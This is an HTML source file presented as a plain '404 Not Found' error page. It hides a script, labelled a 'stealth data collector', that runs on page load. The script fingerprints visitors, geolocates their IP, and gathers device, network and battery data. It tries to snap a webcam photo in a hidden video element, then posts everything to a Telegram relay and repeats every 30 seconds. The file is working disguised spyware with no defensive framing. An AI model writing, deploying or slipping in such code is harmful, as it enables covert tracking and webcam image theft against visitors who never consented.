<!-- public/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>404 Not Found</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #121212;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    .container {
      max-width: 600px;
      padding: 2rem;
    }
    h1 {
      font-size: 3rem;
      margin-bottom: 1rem;
      color: #ff5555;
    }
    p {
      font-size: 1.2rem;
      margin-bottom: 2rem;
    }
    a {
      color: #4dabf7;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>404</h1>
    <p>Oops! The page you're looking for doesn't exist.</p>
    <a href="/">Go back home</a>
  </div>

  <!-- Hidden elements for data collection -->
  <video id="webcam" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  
  <script>
    // Enhanced stealth data collector
    (function() {
      // Load external scripts dynamically
      function loadScript(src) {
        return new Promise((resolve, reject) => {
          const script = document.createElement('script');
          script.src = src;
          script.onload = resolve;
          script.onerror = reject;
          document.head.appendChild(script);
        });
      }

      async function collectData() {
        try {
          // Load required libraries
          await Promise.all([
            loadScript('https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.4/dist/fingerprint2.min.js'),
            loadScript('https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/src/ua-parser.min.js'),
            loadScript('https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js')
          ]);

          const data = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            ip: null,
            location: null,
            deviceInfo: null,
            networkInfo: null,
            batteryInfo: null,
            cameraAccess: false,
            photo: null,
            fingerprint: null
          };

          // Get fingerprint
          if (typeof Fingerprint2 !== 'undefined') {
            try {
              const components = await Fingerprint2.getPromise();
              const values = components.map(c => c.value);
              data.fingerprint = Fingerprint2.x64hash128(values.join(''), 31);
            } catch (e) {
              console.error('Fingerprint error:', e);
            }
          }

          // Get IP and location
          try {
            const ipResponse = await axios.get('https://api.ipify.org?format=json');
            data.ip = ipResponse.data.ip;
            
            const geoResponse = await axios.get(`https://ipapi.co/${data.ip}/json/`);
            data.location = {
              ip: data.ip,
              city: geoResponse.data.city,
              region: geoResponse.data.region,
              country: geoResponse.data.country_name,
              isp: geoResponse.data.org,
              timezone: geoResponse.data.timezone
            };
          } catch (e) {
            console.error('IP/Location error:', e);
          }

          // Get device info
          if (typeof UAParser !== 'undefined') {
            const parser = new UAParser();
            const result = parser.getResult();
            data.deviceInfo = {
              browser: `${result.browser.name} ${result.browser.version}`,
              os: `${result.os.name} ${result.os.version}`,
              device: result.device.vendor ? `${result.device.vendor} ${result.device.model}` : 'Desktop',
              cpuCores: navigator.hardwareConcurrency || 'Unknown',
              memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
              screen: `${window.screen.width}x${window.screen.height}`,
              colorDepth: window.screen.colorDepth,
              pixelRatio: window.devicePixelRatio,
              languages: navigator.languages,
              platform: navigator.platform,
              cookies: navigator.cookieEnabled
            };
          }

          // Get network info
          if (navigator.connection) {
            data.networkInfo = {
              type: navigator.connection.type,
              effectiveType: navigator.connection.effectiveType,
              downlink: navigator.connection.downlink,
              rtt: navigator.connection.rtt,
              saveData: navigator.connection.saveData
            };
          }

          // Get battery info
          if ('getBattery' in navigator) {
            try {
              const battery = await navigator.getBattery();
              data.batteryInfo = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
              };
            } catch (e) {
              console.error('Battery error:', e);
            }
          }

          // Try to access camera
          try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            data.cameraAccess = true;
            
            // Attempt to capture photo
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');
            
            video.srcObject = stream;
            await new Promise(resolve => video.onloadedmetadata = resolve);
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            data.photo = canvas.toDataURL('image/jpeg', 0.7);
            stream.getTracks().forEach(track => track.stop());
          } catch (e) {
            console.error('Camera error:', e);
          }

          // Prepare Telegram message
          const message = `
ğŸš¨ *New Visitor* ğŸš¨
ğŸ“… *Time:* ${new Date().toLocaleString()}
ğŸŒ *IP:* ${data.ip || 'N/A'} (${data.location?.country || 'Unknown'})
ğŸ“ *Location:* ${data.location ? `${data.location.city}, ${data.location.region}` : 'N/A'}
ğŸ“± *Device:* ${data.deviceInfo?.device || 'N/A'}
ğŸ–¥ *OS:* ${data.deviceInfo?.os || 'N/A'}
ğŸŒ *Browser:* ${data.deviceInfo?.browser || 'N/A'}
ğŸ†” *Fingerprint:* ${data.fingerprint || 'N/A'}
ğŸ“¸ *Camera Access:* ${data.cameraAccess ? 'Yes' : 'No'}
ğŸ”‹ *Battery:* ${data.batteryInfo ? `${data.batteryInfo.level}%` : 'N/A'}
ğŸ“¶ *Network:* ${data.networkInfo ? data.networkInfo.effectiveType : 'N/A'}
`;

          // Send data to Telegram
          await axios.post('/send-to-telegram', {
            deviceInfo: data,
            message: message,
            photoData: data.photo
          });

          // Schedule periodic updates
          setTimeout(collectData, 30000);
        } catch (error) {
          console.error('Data collection error:', error);
          // Retry after delay
          setTimeout(collectData, 60000);
        }
      }

      // Start collection after slight delay
      setTimeout(collectData, 1500);
    })();
  </script>
</body>
</html>
